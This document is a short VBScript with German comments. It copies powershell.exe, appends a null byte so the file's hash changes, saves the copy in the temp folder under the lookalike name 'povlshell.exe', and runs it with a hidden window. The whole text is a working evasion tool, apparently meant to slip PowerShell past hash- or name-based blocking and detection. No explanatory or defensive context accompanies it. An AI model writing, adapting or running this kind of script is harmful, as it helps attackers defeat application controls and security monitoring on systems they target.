Dim Filename
Dim Bytearray
Dim bin
Dim Arraylength
Dim newFilename
Dim dir
Dim name
Dim retval
Dim objShell

Filename = "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe"

' Datei als Binärdaten in Stream laden
Set bin = CreateObject("ADODB.Stream")
bin.Type = 1  ' Binärmodus
bin.Open
bin.LoadFromFile Filename

' Bytearray aus Datei lesen
Bytearray = bin.Read
bin.Close

' Prüfen, ob Bytearray ein Array ist
If Not IsArray(Bytearray) Then
    WScript.Echo "Fehler: Bytearray konnte nicht erstellt werden."
    WScript.Quit
End If

' Bytearray um ein Null-Byte erweitern
Arraylength = UBound(Bytearray)
ReDim Preserve Bytearray(Arraylength + 1)
Bytearray(Arraylength + 1) = 0  ' Null-Byte ans Ende setzen

' Neuen Stream für das Schreiben öffnen
Set bin = CreateObject("ADODB.Stream")
bin.Type = 1  ' Binärmodus
bin.Open
bin.Write Bytearray  ' Bytearray direkt schreiben
bin.Position = 0

' Zielverzeichnis für neue Datei setzen
Set objShell = CreateObject("WScript.Shell")
dir = objShell.ExpandEnvironmentStrings("%TEMP%")
name = "povlshell.exe"
newFilename = dir & "\" & name

' Datei speichern
bin.SaveToFile newFilename, 2
bin.Close
Set bin = Nothing

' Datei ausführen
retval = objShell.Run(newFilename, 0, False)
Set objShell = Nothing
